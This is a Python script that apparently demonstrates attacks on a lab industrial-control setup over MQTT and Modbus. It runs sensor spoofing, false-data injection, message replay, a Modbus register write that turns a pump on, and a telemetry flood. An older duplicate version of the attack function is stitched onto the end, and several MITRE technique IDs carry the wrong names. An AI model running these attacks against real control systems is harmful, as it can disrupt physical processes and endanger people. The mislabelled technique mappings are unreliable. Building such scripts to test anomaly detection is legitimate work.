# test_attacks.py
# realistic attack demonstration script for the ICS pipeline
# originally used mode‑based injections; now includes real MQTT/Modbus attacks

import paho.mqtt.client as mqtt
import json
import time
import random
from datetime import datetime

# Optional Modbus TCP client (requires pymodbus)
try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    ModbusTcpClient = None

BROKER = "localhost"
PORT = 1883     # change to 8883 if TLS is enforced
USERNAME = None
PASSWORD = None

# helper to send a telemetry message with overrides

def publish_telemetry(client, overrides):
    base = {
        "timestamp": datetime.now().isoformat(),
        "flow_rate": 5.0,
        "pressure": 10.0,
        "temperature": 25.0,
        "motor_current": 1.2,
        "pump_status": 1,
        "mode": "normal",
        "is_anomaly": 0
    }
    base.update(overrides)
    client.publish("ics/telemetry/data", json.dumps(base))


def replay_capture(client, captured):
    for msg in captured:
        client.publish("ics/telemetry/data", json.dumps(msg))
        time.sleep(0.2)


def modbus_write(register, value, host="localhost", port=502):
    if ModbusTcpClient is None:
        print("pymodbus not installed; skipping Modbus attack")
        return
    c = ModbusTcpClient(host, port)
    if c.connect():
        print(f"Writing {value} to modbus register {register}")
        c.write_register(register, value)
        c.close()
    else:
        print("Modbus TCP connection failed")


def simulate_attacks():
    client = mqtt.Client()
    if USERNAME:
        client.username_pw_set(USERNAME, PASSWORD)
    client.connect(BROKER, PORT, 60)
    print("=== ICS Attack Demonstration ===")

    # 1. spoof sensor by publishing a bad pressure value
    print("\n[1] Sensor spoofing")
    publish_telemetry(client, {"pressure": 5.0})
    time.sleep(5)

    # 2. false-data injection: junk current
    print("\n[2] False data injection")
    publish_telemetry(client, {"motor_current": 10.0})
    time.sleep(5)

    # 3. replay attack
    print("\n[3] Replay attack")
    captured = []
    def on_message(c, u, msg):
        try:
            captured.append(json.loads(msg.payload.decode()))
        except Exception:
            pass
    client.subscribe("ics/telemetry/data")
    client.on_message = on_message
    client.loop_start()
    time.sleep(2)
    client.loop_stop()
    if captured:
        print(f"  captured {len(captured)} msgs, replaying")
        replay_capture(client, captured)
    time.sleep(5)

    # 4. Modbus register write (pump control)
    print("\n[4] Modbus write attack")
    modbus_write(register=4, value=1)  # HREG_PUMP
    time.sleep(5)

    # 5. DoS flood
    print("\n[5] DoS flood")
    for i in range(100):
        publish_telemetry(client, {"flow_rate": random.uniform(0, 100),
                                   "pressure": random.uniform(0, 50),
                                   "temperature": random.uniform(-10, 100),
                                   "motor_current": random.uniform(0, 10),
                                   "is_anomaly": 1})
        time.sleep(0.05)

    print("\nReturning to normal")
    publish_telemetry(client, {})
    client.disconnect()
    print("Done")


if __name__ == "__main__":
    simulate_attacks()

def simulate_attacks():
    client = mqtt.Client()
    client.connect("localhost", 1883, 60)
    
    print("=== ICS Attack Simulation ===")
    print("Simulating 4 attack scenarios from MITRE ATT&CK framework")
    print("=" * 50)
    
    # Attack 1: Sensor Spoofing (TA0104)
    print("\n1. Sensor Spoofing Attack - Pressure sensor fixed at 5.0 psi")
    print("   MITRE Technique: T0836 - Manipulation of Control")
    attack_msg = {
        "mode": "attack",
        "description": "Pressure sensor spoofing",
        "technique": "T0836",
        "duration": 30
    }
    client.publish("mode", json.dumps(attack_msg))
    time.sleep(30)
    
    # Attack 2: False Data Injection (TA0102)
    print("\n2. False Data Injection - Motor current doubled")
    print("   MITRE Technique: T0831 - Input Injection")
    attack_msg = {
        "mode": "attack",
        "description": "False current injection",
        "technique": "T0831",
        "duration": 30
    }
    client.publish("mode", json.dumps(attack_msg))
    time.sleep(30)
    
    # Attack 3: Replay Attack (TA0103)
    print("\n3. Replay Attack - Old telemetry re-injected")
    print("   MITRE Technique: T0859 - Network Sniffing")
    attack_msg = {
        "mode": "attack",
        "description": "Data replay attack",
        "technique": "T0859",
        "duration": 30
    }
    client.publish("mode", json.dumps(attack_msg))
    time.sleep(30)
    
    # Attack 4: Denial of Service (TA0105)
    print("\n4. Denial of Service - Flood with garbage data")
    print("   MITRE Technique: T0819 - Loss of Availability")
    for i in range(50):
        garbage_msg = {
            "timestamp": datetime.now().isoformat(),
            "flow_rate": random.uniform(0, 100),
            "pressure": random.uniform(0, 50),
            "temperature": random.uniform(-10, 100),
            "motor_current": random.uniform(0, 10),
            "pump_status": random.randint(0, 1),
            "is_anomaly": 1
        }
        client.publish("ics/telemetry/data", json.dumps(garbage_msg))
        time.sleep(0.1)
    
    # Return to normal
    print("\nReturning to normal operation...")
    client.publish("mode", json.dumps({"mode": "normal"}))
    
    client.disconnect()
    print("\nAttack simulation complete!")

if __name__ == "__main__":
    simulate_attacks()
